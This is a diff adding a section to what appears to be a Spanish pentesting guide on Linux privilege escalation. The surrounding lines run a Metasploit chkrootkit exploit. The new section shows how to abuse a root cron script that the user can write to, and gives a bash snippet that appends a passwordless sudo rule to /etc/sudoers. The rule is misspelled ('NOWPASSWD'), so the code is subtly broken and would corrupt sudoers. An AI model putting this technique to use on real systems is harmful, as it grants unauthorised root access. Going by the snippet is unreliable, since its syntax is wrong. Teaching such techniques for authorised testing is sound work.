@@ -104,4 +104,13 @@ msf exploit(unix/local/chkrootkit) > set lport puerto_kali
 msf exploit(unix/local/chkrootkit) > run
 ```
 
+## Escalada de privilegios mediante cronjobs
+
+En caso de encontrar un archivo o un script que se esté ejecutando desde cron con permisos de root y pueda ser leido y modificado por nuestro usuario, podemos usarlo para ejecutar una orden que nos eleve los privilegios, por ejemplo añadiendo:
+
+```bash
+#!/bin/bash
+echo "usuario ALL=NOWPASSWD:ALL" >> /etc/sudoers
+```  
+
 [⟵ Anterior](06_win_privesc.md) | [Siguiente ⟶](08_persistencia.md)
